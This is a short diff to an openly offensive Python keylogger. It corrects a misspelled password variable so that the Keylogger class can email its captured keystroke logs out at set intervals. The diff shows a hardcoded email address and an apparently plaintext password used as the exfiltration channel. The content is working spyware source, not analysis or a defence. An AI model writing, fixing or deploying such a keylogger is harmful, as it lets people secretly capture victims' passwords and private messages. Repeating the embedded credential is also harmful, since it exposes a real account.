@@ -6,7 +6,7 @@ from datetime import datetime
 
 SEND_REPORT_EVERY = 60
 EMAIL_ADDRESS = "jul00howell@gmail.com"
-EMAIl_PASSWORD = "Julian00Howell"
+EMAIL_PASSWORD = "Julian00Howell"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -59,7 +59,7 @@ class Keylogger:
             self.update_filename()
 
             if self.report_method == "email":
-                self.send_email(EMAIL_ADDRESS, EMAIl_PASSWORD, self.log)
+                self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
             
